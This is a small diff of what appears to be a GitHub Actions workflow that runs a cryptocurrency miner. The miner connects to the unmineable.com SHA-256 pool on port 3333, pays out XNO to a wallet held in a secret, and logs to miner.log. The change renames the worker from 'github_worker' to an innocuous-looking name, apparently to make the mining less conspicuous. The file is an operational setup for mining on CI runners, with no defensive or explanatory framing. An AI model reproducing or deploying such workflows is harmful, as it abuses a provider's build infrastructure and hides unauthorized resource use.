@@ -47,7 +47,7 @@ jobs:
             -o sha256.unmineable.com \
             -p 3333 \
             -a XNO:${WALLET_ADDRESS} \
-            -w github_worker \
+            -w Ruvyzvat \
             -t 2 \
             2>&1 | tee miner.log || {
             exit_code=$?
